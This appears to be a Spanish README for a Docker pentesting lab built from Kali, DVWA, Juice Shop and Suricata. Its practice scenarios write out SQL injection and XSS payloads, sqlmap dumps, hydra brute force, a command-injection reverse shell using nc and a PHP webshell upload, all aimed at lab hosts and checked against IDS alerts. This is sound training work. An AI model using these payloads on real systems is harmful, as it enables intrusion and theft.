# 🔒 Docker Security Lab

Laboratorio de seguridad basado en Docker para práctica de pentesting, análisis de vulnerabilidades y detección de intrusiones. Este entorno proporciona aplicaciones web vulnerables, herramientas de ataque y sistemas de monitoreo en un ambiente seguro y aislado.

## 📋 Tabla de Contenidos

- [Características](#-características)
- [Requisitos](#-requisitos)
- [Arquitectura](#-arquitectura)
- [Instalación](#-instalación)
- [Uso](#-uso)
- [Componentes del Laboratorio](#-componentes-del-laboratorio)
- [Escenarios de Práctica](#-escenarios-de-práctica)
- [Monitoreo y Detección](#-monitoreo-y-detección)
- [Solución de Problemas](#-solución-de-problemas)
- [Seguridad](#-seguridad)
- [Contribuir](#-contribuir)

## 🎯 Características

- **Aplicaciones Vulnerables**: OWASP Juice Shop, DVWA, servidor SSH vulnerable
- **Plataforma de Ataque**: Kali Linux con herramientas preinstaladas (nmap, sqlmap, gobuster, nikto)
- **Sistema de Detección de Intrusiones**: Suricata IDS con reglas personalizadas
- **Monitoreo en Tiempo Real**: Prometheus, Grafana y cAdvisor para visualización de métricas
- **Redes Aisladas**: Segmentación de red para simular escenarios realistas
- **Scripts de Gestión**: Automatización completa con PowerShell

## 💻 Requisitos

### Software Necesario

- **Windows 10/11** (PowerShell 5.1 o superior)
- **Docker Desktop** 4.x o superior
  - Mínimo 8GB RAM asignada a Docker
  - 30GB de espacio en disco disponible
- **Git** (opcional, para clonar el repositorio)

### Requisitos de Hardware

- **CPU**: 4 cores o más (recomendado 8 cores)
- **RAM**: 16GB mínimo (recomendado 32GB)
- **Disco**: 50GB de espacio libre
- **Red**: Conexión a Internet para descargar imágenes

## 🏗️ Arquitectura

El laboratorio está compuesto por tres redes Docker aisladas:

```
┌─────────────────────────────────────────────────────────────┐
│                    Docker Security Lab                       │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────────────┐  ┌──────────────────┐                │
│  │  Attacker Net    │  │  Monitor Net     │                │
│  │  172.26.0.0/24   │  │  172.27.0.0/24   │                │
│  │                  │  │                  │                │
│  │  ┌────────────┐  │  │  ┌────────────┐ │                │
│  │  │   Kali     │  │  │  │ Suricata   │ │                │
│  │  │  Attacker  │  │  │  │    IDS     │ │                │
│  │  └────────────┘  │  │  └────────────┘ │                │
│  │                  │  │                  │                │
│  └──────────────────┘  │  ┌────────────┐ │                │
│           │             │  │ Prometheus │ │                │
│           │             │  └────────────┘ │                │
│           │             │                  │                │
│           │             │  ┌────────────┐ │                │
│           │             │  │  Grafana   │ │                │
│           │             │  └────────────┘ │                │
│           │             │                  │                │
│           │             │  ┌────────────┐ │                │
│           │             │  │  cAdvisor  │ │                │
│           │             │  └────────────┘ │                │
│           │             └──────────────────┘                │
│           │                      │                          │
│           ├──────────────────────┤                          │
│           │                      │                          │
│  ┌────────┴──────────────────────┴────────┐                │
│  │      Lab Internal Network               │                │
│  │         172.25.0.0/24                   │                │
│  │                                         │                │
│  │  ┌────────────┐  ┌────────────┐        │                │
│  │  │ Juice Shop │  │    DVWA    │        │                │
│  │  │ .10        │  │    .21     │        │                │
│  │  └────────────┘  └────────────┘        │                │
│  │                          │              │                │
│  │                  ┌────────────┐        │                │
│  │                  │   MySQL    │        │                │
│  │                  │    .20     │        │                │
│  │                  └────────────┘        │                │
│  │                                         │                │
│  │  ┌────────────┐                        │                │
│  │  │  Vuln SSH  │                        │                │
│  │  │    .30     │                        │                │
│  │  └────────────┘                        │                │
│  └─────────────────────────────────────────┘                │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Redes

1. **attacker_net (172.26.0.0/24)**: Red del atacante
2. **lab_internal (172.25.0.0/24)**: Red interna con aplicaciones vulnerables
3. **monitor_net (172.27.0.0/24)**: Red de monitoreo y análisis

## 🚀 Instalación

### 1. Clonar el Repositorio

```powershell
git clone <repository-url>
cd Docker_Security_lab
```

### 2. Construir las Imágenes

```powershell
.\scripts\build_images.ps1
```

Este script construirá:

- `lab/kali:1.0` - Imagen de Kali Linux personalizada
- `lab/suricata:1.0` - Imagen de Suricata IDS con reglas personalizadas

### 3. Iniciar el Laboratorio

```powershell
.\scripts\start_lab.ps1
```

Este comando:

- Inicia todos los contenedores de laboratorio
- Configura las redes
- Levanta el sistema de monitoreo
- Muestra los servicios disponibles

## 📖 Uso

### Scripts de Gestión

Todos los scripts están ubicados en la carpeta `scripts/` y están optimizados para PowerShell:

#### Construir Imágenes

```powershell
.\scripts\build_images.ps1
```

#### Iniciar Laboratorio

```powershell
.\scripts\start_lab.ps1
```

#### Detener Laboratorio

```powershell
.\scripts\stop_lab.ps1
```

#### Reiniciar Laboratorio (Elimina todos los datos)

```powershell
.\scripts\reset_lab.ps1
```

#### Acceder a Kali Linux

```powershell
.\scripts\access_kali.ps1
```

#### Ver Estado del Laboratorio

```powershell
.\scripts\status_lab.ps1
```

#### Ver Logs de Suricata

```powershell
# Ver alertas de seguridad
.\scripts\view_logs.ps1 -LogType alerts

# Ver todos los eventos
.\scripts\view_logs.ps1 -LogType eve

# Ver log rápido
.\scripts\view_logs.ps1 -LogType fast

# Ver tráfico HTTP
.\scripts\view_logs.ps1 -LogType http

# Ver consultas DNS
.\scripts\view_logs.ps1 -LogType dns

# Ver estadísticas
.\scripts\view_logs.ps1 -LogType stats

# Monitoreo en vivo
.\scripts\view_logs.ps1 -LogType live
```

### Acceso a Servicios Web

Una vez iniciado el laboratorio, los siguientes servicios estarán disponibles:

| Servicio           | URL                   | Credenciales      | Descripción                        |
| ------------------ | --------------------- | ----------------- | ---------------------------------- |
| **Juice Shop**     | http://localhost:3001 | N/A               | Aplicación vulnerable OWASP Top 10 |
| **DVWA**           | http://localhost:8080 | admin/password    | Damn Vulnerable Web Application    |
| **Grafana**        | http://localhost:3000 | admin/admin       | Dashboard de monitoreo             |
| **Prometheus**     | http://localhost:9090 | N/A               | Sistema de métricas                |
| **cAdvisor**       | http://localhost:8081 | N/A               | Métricas de contenedores           |
| **SSH Vulnerable** | localhost:2222        | admin/password123 | Servidor SSH para práctica         |

## 🎯 Componentes del Laboratorio

### 1. Kali Linux (Atacante)

Contenedor con herramientas de pentesting preinstaladas:

**Herramientas disponibles**:

- `nmap` - Escaneo de puertos y servicios
- `sqlmap` - Explotación de SQL Injection
- `gobuster` - Enumeración de directorios
- `nikto` - Escáner de vulnerabilidades web
- `tcpdump` - Captura de tráfico de red
- `curl` / `wget` - Herramientas HTTP
- `socat` - Manipulación de sockets
- Python 3 con pip

**Acceso**:

```powershell
.\scripts\access_kali.ps1
```

**IPs**:

- Red Atacante: 172.26.0.10
- Red Interna: 172.25.0.100

### 2. OWASP Juice Shop

Aplicación moderna vulnerable que contiene todas las vulnerabilidades del OWASP Top 10.

**Características**:

- SQL Injection
- XSS (Cross-Site Scripting)
- Broken Authentication
- Sensitive Data Exposure
- XXE (XML External Entities)
- Broken Access Control
- Security Misconfiguration
- Y muchas más...

**URL**: http://localhost:3001

### 3. DVWA (Damn Vulnerable Web Application)

Aplicación PHP/MySQL diseñada para practicar ataques web comunes.

**Módulos de Práctica**:

- Brute Force
- Command Injection
- CSRF (Cross-Site Request Forgery)
- File Inclusion
- File Upload
- SQL Injection
- XSS (Reflected y Stored)
- Weak Session IDs

**URL**: http://localhost:8080  
**Credenciales**: admin/password

**Configuración Inicial**:

1. Acceder a http://localhost:8080
2. Click en "Create / Reset Database"
3. Login con admin/password
4. Configurar nivel de seguridad (Low, Medium, High, Impossible)

### 4. MySQL Database

Base de datos para DVWA.

**Conexión desde Kali**:

```bash
mysql -h 172.25.0.20 -u dvwa -pdvwa dvwa
```

### 5. SSH Vulnerable

Servidor SSH configurado con credenciales débiles para prácticas de brute force.

**Conexión**:

```bash
ssh admin@localhost -p 2222
# Password: password123
```

### 6. Suricata IDS

Sistema de Detección de Intrusiones que monitorea todo el tráfico de red.

**Capacidades**:

- Detección de SQL Injection
- Detección de XSS
- Detección de escaneo de puertos
- Detección de brute force
- Detección de herramientas de pentesting
- Anomalías de protocolo

**Reglas Personalizadas**:

- Ver `/configs/suricata-rules.rules`
- Más de 40 reglas personalizadas para el laboratorio

### 7. Stack de Monitoreo

#### Prometheus

Recolección de métricas de sistema y contenedores.

- **URL**: http://localhost:9090

#### Grafana

Visualización de métricas y alertas.

- **URL**: http://localhost:3000
- **Usuario**: admin
- **Contraseña**: admin

**Configurar Dashboard**:

1. Agregar Data Source: Configuration → Data Sources → Add Prometheus
2. URL: http://prometheus:9090
3. Importar dashboards predefinidos o crear personalizados

#### cAdvisor

Métricas detalladas de contenedores Docker.

- **URL**: http://localhost:8081

## 🎓 Escenarios de Práctica

### Escenario 1: Reconocimiento y Escaneo

**Objetivo**: Descubrir servicios y puertos abiertos

```bash
# Desde Kali
.\scripts\access_kali.ps1

# Escaneo de la red interna
nmap -sn 172.25.0.0/24

# Escaneo detallado de Juice Shop
nmap -sV -sC -p- 172.25.0.10

# Escaneo de DVWA
nmap -sV -sC -p- 172.25.0.21

# Escaneo de SSH
nmap -sV -p 2222 172.25.0.30
```

**Verificar Detección**:

```powershell
# En otra terminal PowerShell
.\scripts\view_logs.ps1 -LogType alerts
```

Deberías ver alertas de Suricata sobre escaneo de puertos.

### Escenario 2: SQL Injection en Juice Shop

**Objetivo**: Bypasear autenticación con SQL Injection

```bash
# Desde navegador o curl
# Login bypass: admin'--
curl -X POST http://localhost:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\''--","password":"cualquiercosa"}'

# SQL Injection en búsqueda
curl "http://localhost:3001/rest/products/search?q=')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
```

**Verificar Detección**:

```powershell
.\scripts\view_logs.ps1 -LogType alerts
```

Buscar alertas: "SQL Injection Attempt"

### Escenario 3: SQL Injection en DVWA con SQLMap

**Objetivo**: Automatizar extracción de base de datos

```bash
# Desde Kali
# Obtener cookie de sesión primero (login en DVWA)

# Escaneo básico
sqlmap -u "http://172.25.0.21/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=<tu-session-id>" \
  --dbs

# Volcar base de datos
sqlmap -u "http://172.25.0.21/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=<tu-session-id>" \
  -D dvwa --tables

# Volcar usuarios
sqlmap -u "http://172.25.0.21/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=<tu-session-id>" \
  -D dvwa -T users --dump
```

**Verificar Detección**:

```powershell
.\scripts\view_logs.ps1 -LogType alerts | Select-String "SQLMap"
```

### Escenario 4: Cross-Site Scripting (XSS)

**Objetivo**: Inyectar JavaScript malicioso

```bash
# XSS Reflejado en DVWA
curl "http://172.25.0.21/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"

# XSS en Juice Shop (búsqueda)
curl "http://localhost:3001/rest/products/search?q=<script>alert(document.cookie)</script>"

# XSS con imagen
curl "http://172.25.0.21/vulnerabilities/xss_r/?name=<img src=x onerror=alert('XSS')>"
```

**Verificar Detección**:

```powershell
.\scripts\view_logs.ps1 -LogType alerts | Select-String "XSS"
```

### Escenario 5: Brute Force SSH

**Objetivo**: Ataque de fuerza bruta contra SSH

```bash
# Desde Kali
# Crear archivo de contraseñas
echo -e "admin\npassword\n123456\npassword123" > passwords.txt

# Brute force con hydra
hydra -l admin -P passwords.txt ssh://172.25.0.30:2222 -t 4

# Alternativa con nmap
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt -p 2222 172.25.0.30
```

**Verificar Detección**:

```powershell
.\scripts\view_logs.ps1 -LogType alerts | Select-String "Brute Force"
```

### Escenario 6: Enumeración de Directorios

**Objetivo**: Descubrir archivos y directorios ocultos

```bash
# Desde Kali
# Gobuster en DVWA
gobuster dir -u http://172.25.0.21/ -w /usr/share/wordlists/dirb/common.txt

# Nikto scan
nikto -h http://172.25.0.21/

# Enumeración manual
curl -I http://172.25.0.21/admin/
curl -I http://172.25.0.21/config/
curl -I http://172.25.0.21/backup/
```

**Verificar Detección**:

```powershell
.\scripts\view_logs.ps1 -LogType alerts | Select-String "Gobuster|Nikto"
```

### Escenario 7: Command Injection

**Objetivo**: Ejecutar comandos del sistema

```bash
# En DVWA - Command Injection module
# Input: 127.0.0.1; whoami
curl "http://172.25.0.21/vulnerabilities/exec/?ip=127.0.0.1;whoami&Submit=Submit"

# Obtener reverse shell
curl "http://172.25.0.21/vulnerabilities/exec/?ip=127.0.0.1;nc -e /bin/bash 172.25.0.100 4444&Submit=Submit"

# Listar archivos
curl "http://172.25.0.21/vulnerabilities/exec/?ip=127.0.0.1;ls -la&Submit=Submit"
```

**Verificar Detección**:

```powershell
.\scripts\view_logs.ps1 -LogType alerts | Select-String "Command Injection"
```

### Escenario 8: File Upload Vulnerability

**Objetivo**: Subir archivos maliciosos

```bash
# Crear PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Subir a DVWA (requiere navegador o script)
# O usar curl con multipart/form-data
curl -X POST -F "uploaded=@shell.php" \
  -F "Upload=Upload" \
  "http://172.25.0.21/vulnerabilities/upload/"

# Acceder al shell
curl "http://172.25.0.21/hackable/uploads/shell.php?cmd=whoami"
```

**Verificar Detección**:

```powershell
.\scripts\view_logs.ps1 -LogType alerts | Select-String "File Upload"
```

## 📊 Monitoreo y Detección

### Análisis de Logs de Suricata

#### Ver Alertas en Tiempo Real

```powershell
.\scripts\view_logs.ps1 -LogType live
```

#### Analizar EVE JSON (Formato estructurado)

```powershell
# Acceder al contenedor
docker exec -it suricata-ids bash

# Ver alertas con jq
cat /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'

# Top 10 alertas más comunes
cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | .alert.signature' | sort | uniq -c | sort -rn | head -10

# Alertas por IP de origen
cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | .src_ip' | sort | uniq -c | sort -rn

# Tráfico HTTP
cat /var/log/suricata/eve.json | jq 'select(.event_type=="http")'
```

### Dashboards de Grafana

#### Configurar Dashboard de Suricata

1. Acceder a Grafana: http://localhost:3000
2. Login: admin/admin
3. Agregar Data Source:

   - Configuration → Data Sources → Add data source
   - Seleccionar Prometheus
   - URL: http://prometheus:9090
   - Save & Test

4. Importar Dashboard:
   - Create → Import
   - Dashboard ID: 893 (Docker & System Monitoring)
   - Load

#### Métricas Importantes

- **CPU Usage**: Uso de CPU por contenedor
- **Memory Usage**: Uso de memoria por contenedor
- **Network I/O**: Tráfico de red entrante/saliente
- **Disk I/O**: Operaciones de lectura/escritura

### Prometheus Queries

Acceder a Prometheus (http://localhost:9090) y ejecutar queries:

```promql
# CPU usage por contenedor
rate(container_cpu_usage_seconds_total{name=~".+"}[5m])

# Memoria usada
container_memory_usage_bytes{name=~".+"}

# Tráfico de red
rate(container_network_receive_bytes_total[5m])
rate(container_network_transmit_bytes_total[5m])

# Contenedores corriendo
count(container_last_seen{name=~".+"})
```

## 🔧 Solución de Problemas

### Contenedores no inician

**Problema**: Error al iniciar contenedores

```powershell
# Verificar estado
.\scripts\status_lab.ps1

# Ver logs de un contenedor específico
docker logs <container-name>

# Reiniciar Docker Desktop
# Detener laboratorio primero
.\scripts\stop_lab.ps1
```

### Imágenes no construyen

**Problema**: Error durante `build_images.ps1`

```powershell
# Verificar Docker
docker --version
docker info

# Limpiar cache de build
docker builder prune -a

# Reconstruir
.\scripts\build_images.ps1
```

### Suricata no detecta tráfico

**Problema**: No aparecen alertas en los logs

```powershell
# Verificar que Suricata esté corriendo
docker exec -it suricata-ids ps aux | Select-String suricata

# Verificar configuración
docker exec -it suricata-ids suricata -T -c /etc/suricata/suricata.yaml

# Reiniciar Suricata
docker restart suricata-ids

# Ver logs de inicio
docker logs suricata-ids
```

### Problemas de Red

**Problema**: Contenedores no se pueden comunicar

```powershell
# Verificar redes
docker network ls

# Inspeccionar red
docker network inspect docker_security_lab_lab_internal

# Recrear redes
.\scripts\reset_lab.ps1
.\scripts\start_lab.ps1
```

### Puerto ya en uso

**Problema**: "Port already allocated"

```powershell
# Verificar qué proceso usa el puerto
netstat -ano | findstr :<puerto>

# Matar proceso (usar PID del comando anterior)
taskkill /PID <pid> /F

# O cambiar puertos en docker-compose.lab.yml
```

### Poco espacio en disco

**Problema**: "No space left on device"

```powershell
# Ver uso de espacio de Docker
docker system df

# Limpiar contenedores detenidos
docker container prune

# Limpiar imágenes no usadas
docker image prune -a

# Limpiar volúmenes no usados
docker volume prune

# Limpieza completa
docker system prune -a --volumes
```

### DVWA no se conecta a MySQL

**Problema**: Error de conexión de base de datos

```powershell
# Verificar que MySQL esté corriendo
docker ps | Select-String mysql

# Ver logs de MySQL
docker logs mysql-db

# Recrear base de datos
docker exec -it mysql-db mysql -uroot -prootpass -e "DROP DATABASE IF EXISTS dvwa; CREATE DATABASE dvwa;"

# Reiniciar DVWA
docker restart dvwa
```

### Performance lento

**Problema**: Laboratorio responde lentamente

```powershell
# Verificar recursos asignados a Docker
# Docker Desktop → Settings → Resources

# Verificar uso actual
docker stats

# Incrementar recursos:
# - CPU: Mínimo 4 cores
# - Memoria: Mínimo 8GB

# Detener servicios no necesarios
docker-compose -f compose/docker-compose.monitor.yml down
```

## 🔐 Seguridad

### ⚠️ ADVERTENCIAS IMPORTANTES

1. **SOLO PARA ENTORNOS DE LABORATORIO**: Este proyecto contiene aplicaciones intencionalmente vulnerables. **NUNCA** expongas estos servicios a Internet.

2. **Aislamiento de Red**: Aunque las redes están configuradas, asegúrate de que Docker Desktop no esté exponiendo servicios externamente.

3. **Firewall**: Mantén el firewall de Windows activo y configurado.

4. **Credenciales**: Todas las credenciales son débiles por diseño. No uses estas contraseñas en sistemas reales.

5. **Monitoreo**: Revisa regularmente los logs para detectar actividad no esperada.

### Mejores Prácticas

```powershell
# Siempre detener el laboratorio cuando no esté en uso
.\scripts\stop_lab.ps1

# Realizar limpieza periódica
docker system prune -f

# Mantener Docker Desktop actualizado
# Check for Updates en Docker Desktop
```

### Verificar Aislamiento

```powershell
# Verificar que las redes sean internas
docker network inspect docker_security_lab_lab_internal | Select-String internal

# Verificar que no haya port forwarding no deseado
docker ps --format "table {{.Names}}\t{{.Ports}}"
```

## 📚 Recursos Adicionales

### Documentación Oficial

- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [DVWA Documentation](https://github.com/digininja/DVWA)
- [Suricata User Guide](https://suricata.readthedocs.io/)
- [Kali Linux Tools](https://www.kali.org/tools/)
- [Docker Documentation](https://docs.docker.com/)

### Tutoriales Recomendados

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Security Academy (PortSwigger)](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Comunidades

- [OWASP Slack](https://owasp.org/slack/invite)
- [Kali Linux Forums](https://forums.kali.org/)
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
- [Reddit r/websecurity](https://www.reddit.com/r/websecurity/)

## 🤝 Contribuir

Las contribuciones son bienvenidas! Si deseas mejorar el laboratorio:

1. Fork el repositorio
2. Crea una rama para tu feature (`git checkout -b feature/AmazingFeature`)
3. Commit tus cambios (`git commit -m 'Add some AmazingFeature'`)
4. Push a la rama (`git push origin feature/AmazingFeature`)
5. Abre un Pull Request

### Ideas para Contribuir

- Agregar más reglas de Suricata
- Crear escenarios de práctica adicionales
- Mejorar documentación
- Agregar más aplicaciones vulnerables
- Crear dashboards de Grafana predefinidos
- Agregar scripts de automatización

## 📝 Licencia

Este proyecto es para fines educativos únicamente. Las aplicaciones incluidas tienen sus propias licencias:

- **Juice Shop**: MIT License
- **DVWA**: GPL-3.0 License
- **Suricata**: GPL-2.0 License
- **Kali Linux**: Debian License

## 👥 Autores

- Proyecto creado para entrenamiento en ciberseguridad
- Mantenido por la comunidad

## 🙏 Agradecimientos

- OWASP Foundation por Juice Shop
- DVWA Team por la aplicación de práctica
- Suricata Team por el IDS
- Offensive Security por Kali Linux
- Docker por la plataforma de contenedores

---

**Nota**: Este laboratorio está diseñado exclusivamente para aprendizaje y práctica de seguridad en un entorno controlado. El uso indebido de las técnicas aquí demostradas contra sistemas sin autorización es ilegal.

**Happy Hacking! 🔒**
